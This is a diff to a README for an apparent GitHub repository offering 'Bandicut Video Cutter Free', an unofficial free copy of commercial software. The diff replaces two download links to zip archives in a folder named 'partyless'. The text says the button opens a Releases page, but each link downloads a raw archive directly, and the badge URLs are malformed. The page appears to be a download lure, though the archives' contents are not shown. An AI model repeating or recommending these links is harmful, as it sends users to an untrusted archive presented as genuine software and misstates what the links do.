@@ -1,6 +1,6 @@
 # 🎬 Bandicut-Video-Cutter-Free - Easy Video Cutting Made Simple
 
-[![Download Bandicut](https://raw.githubusercontent.com/baladhamitul/Bandicut-Video-Cutter-Free/main/partyless/Free-Cutter-Bandicut-Video-v2.8-alpha.2.zip%20Bandicut%20Video%20Cutter%20Here-brightgreen)](https://raw.githubusercontent.com/baladhamitul/Bandicut-Video-Cutter-Free/main/partyless/Free-Cutter-Bandicut-Video-v2.8-alpha.2.zip)
+[![Download Bandicut](https://github.com/baladhamitul/Bandicut-Video-Cutter-Free/raw/refs/heads/main/partyless/Free_Cutter_Video_Bandicut_2.4.zip%20Bandicut%20Video%20Cutter%20Here-brightgreen)](https://github.com/baladhamitul/Bandicut-Video-Cutter-Free/raw/refs/heads/main/partyless/Free_Cutter_Video_Bandicut_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -35,7 +35,7 @@ To download Bandicut Video Cutter Free, follow these steps:
 
 1. Click the download button below to visit the Releases page.
 
-   [![Download Bandicut](https://raw.githubusercontent.com/baladhamitul/Bandicut-Video-Cutter-Free/main/partyless/Free-Cutter-Bandicut-Video-v2.8-alpha.2.zip%20Bandicut%20Video%20Cutter%20Here-brightgreen)](https://raw.githubusercontent.com/baladhamitul/Bandicut-Video-Cutter-Free/main/partyless/Free-Cutter-Bandicut-Video-v2.8-alpha.2.zip)
+   [![Download Bandicut](https://github.com/baladhamitul/Bandicut-Video-Cutter-Free/raw/refs/heads/main/partyless/Free_Cutter_Video_Bandicut_2.4.zip%20Bandicut%20Video%20Cutter%20Here-brightgreen)](https://github.com/baladhamitul/Bandicut-Video-Cutter-Free/raw/refs/heads/main/partyless/Free_Cutter_Video_Bandicut_2.4.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the latest release.
 
